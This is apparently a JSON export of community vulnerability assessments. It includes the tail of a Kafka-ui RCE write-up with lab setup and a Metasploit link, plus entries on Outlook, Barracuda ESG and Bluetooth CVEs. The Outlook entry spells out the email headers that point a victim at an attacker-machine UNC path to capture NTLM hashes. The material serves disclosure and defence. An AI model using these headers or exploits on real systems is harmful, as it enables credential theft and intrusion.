- kafka\r\n      - zookeeper\r\n    environment:\r\n      KAFKA_CLUSTERS_0_NAME: local\r\n      KAFKA_CLUSTERS_0_BOOTSTRAPSERVERS: kafka:9092\r\n      KAFKA_CLUSTERS_0_ZOOKEEPER: zookeeper:2181\r\n      KAFKA_BROKERCONNECT: kafka:9092\r\n      DYNAMIC_CONFIG_ENABLED: 'true'\r\n      KAFKA_CLUSTERS_0_METRICS_PORT: 9997\r\n``` \r\n* Run following command `docker-compose up -d` to install and run the Kafka ui and cluster environment.\r\n* Your Kafka ui should be accessible on `http://localhost:8080` with an active Kafka cluster running.\r\n* You can bring down the environment for a fresh start with the command `docker-compose down --volumes`.\r\n\r\nYou are now ready to test the vulnerability.\r\n\r\nAnd as usual, I took the liberty to code a nice Metasploit module that does it all for you.\r\nYou can find the module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/kafka_ui_unauth_rce_cve_2023_52251.rb) in my local repository or as [PR 18700](https://github.com/rapid7/metasploit-framework/pull/18700) at Metasploit Github development.\r\n\r\n### Mitigation\r\nKafka-ui versions between `v0.4.0` - `v0.7.1` are vulnerable and there is no fix. \r\nThere is no outlook yet when it will be fixed, so do not use a default installation which has no authentication enabled.\r\nIt is strongly advised to configure Kafka-ui with basic authentication.\r\n\r\n### References\r\n[CVE-2023-52251](https://nvd.nist.gov/vuln/detail/CVE-2023-52251)\r\n[Kafka-ui unauthenticated RCE - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/kafka_ui_unauth_rce_cve_2023_52251.rb)\r\n[Kafka-ui unauthenticated RCE - Metasploit PR 18700](https://github.com/rapid7/metasploit-framework/pull/18700)\r\n[POC](https://github.com/BobTheShoplifter/CVE-2023-52251-POC)\r\n[Kafka-ui Github development](https://github.com/provectus/kafka-ui)\r\n\r\n### Credits\r\n* [BobTheShopLifter](https://github.com/BobTheShoplifter/)\r\n* [ThingStad](https://github.com/ThingStad/)\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e0b9a9db-17a2-47d1-a8e2-6cb0691b8829",
      "editorId": "04e0a3a0-9153-4d1a-899a-6b367f6b1ed0",
      "topicId": "fb22200e-493f-4005-a798-f5c343aa0fe1",
      "created": "2024-01-21T08:29:14.643978Z",
      "revisionDate": "2024-01-23T16:55:18.099783Z",
      "document": "Discovered by Dolev Taler from the Varonis Threat Labs team, CVE-2023-35636 is an exploit of the calendar-sharing function in Microsoft Outlook, whereby adding two headers to an email directs Outlook to share content and contact a designated machine, creating an opportunity to intercept an NTLM v2 hash. \r\n\r\n1. An attacker crafts an email invite to the victim, pointing the \u201c.ICS\u201d file path to the attacker-controlled machine. By \u201clistening\u201d to a self-controlled path (domain, IP, folder path, UNC, etc.), the threat actor can obtain connection attempt packets that contain the hash used to access this resource. Many tools are used to perform this listening, and in the example above, Responder.py was used (the go-to tool for every SMB and NTLM hash attack).\r\n2. If the victim clicks on the \u201cOpen this iCal\u201d button inside the message, their machine will attempt to retrieve the configuration file on the attacker's machine, exposing the victim\u2019s NTLM hash during authentication. \r\n\r\nExploited headers: \r\n`\"Content-Class\" = \"Sharing\" `\r\n`\"x-sharing-config-url\" = \\\\(Attacker machine)\\a.ics `\r\n\r\n1. \"Content-Class\" = \"Sharing\" \u2014 This tells Outlook that this email contains sharing content.\r\n2. \"x-sharing-config-url\" = \\\\(Attacker machine)\\a.ics \u2014 The second line points the victim\u2019s Outlook to the attacker\u2019s machine.\r\n\r\nUsually, NTLM v2 should be used when attempting to authenticate against internal IP-address-based services. However, when the NTLM v2 hash is passing through the open internet, it is vulnerable to relay and offline brute-force attacks. \r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "f3a9a56e-4bd5-490a-9123-2fbdfab5e353",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "39355727-b043-48a4-bd09-35ce854ce0c4",
      "created": "2024-01-21T18:18:54.312343Z",
      "revisionDate": "2024-01-21T18:20:11.597035Z",
      "document": "See the [Rapid7 Analysis](https://attackerkb.com/topics/2Z0CWopGPX/cve-2023-2868/rapid7-analysis) for a full technical analysis of this vulnerability, including proof-of-concept code. \r\n\r\nThe vendor's advisory has now [grown to encompass](https://www.barracuda.com/company/legal/esg-vulnerability) CVE-2023-7102, another zero-day vulnerability in ESG appliances, in addition to the original CVE-2023-2868. Both attacks attributed to \"suspected China-nexus actor\" UNC4841 by Mandiant, which has [multiple](https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally) [analyses](https://www.mandiant.com/resources/blog/unc4841-post-barracuda-zero-day-remediation) available along with IOCs.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "e28ec35e-6f67-4b22-b738-dc5815c2d4ea",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "7e34cbc3-31aa-48ad-bd45-ce8cbcb932d0",
      "created": "2024-01-22T10:47:02.377193Z",
      "revisionDate": "2024-01-22T10:47:02.376696Z",
      "document": "CVE-2024-21306 is part of a series of vulnerabilities affecting the Bluetooth stacks in multiple operating systems, allowing attackers to pair a virtual Bluetooth keyboard without authentication or user confirmation. \r\n\r\nThis vulnerability impacts Windows systems when a Bluetooth keyboard has been paired with the computer and is either powered off or out of range. In this case, the Windows system can be exploited if the user interacts with a malicious pairing request in any way (clicking accept, reject, or close). This vulnerability has been fixed in the January 2024 Patch Tuesday updates for Windows 10, 11, and Server 2022.\r\n\r\nThis is part of a broader issue with Bluetooth vulnerabilities across various platforms, including Android, Linux, macOS, and iOS, each having its own conditions and methods of exploitation. The vulnerabilities generally allow for keystroke injection, posing significant security risks.",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    }
  ]
}